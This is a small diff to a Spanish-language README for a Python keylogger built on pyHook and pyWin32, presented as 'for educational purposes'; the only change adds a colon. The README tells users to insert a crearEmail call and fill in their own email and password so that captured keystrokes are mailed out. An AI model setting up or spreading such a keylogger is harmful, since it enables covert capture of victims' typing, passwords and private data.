@@ -2,7 +2,7 @@
 Aquí os dejo un código de KeyLogger utilizando las librerias "pyHook" y "pyWin32" :9 (Este archivo está subido con fines educativos)
 
 ***IMPORTANTE***
-En la línea 20 del código en la función "CrearEmail" deberéis añadir esto crearEmail('', '', '', 'Nueva captura:' +fecha, data)
+En la línea 20 del código en la función "CrearEmail" deberéis añadir esto: crearEmail('', '', '', 'Nueva captura:' +fecha, data)
 
 
 En la acción "CrearEmail" dentro de las comillas las cuales están vacias, solo tenéis que añadir vuestro email, password
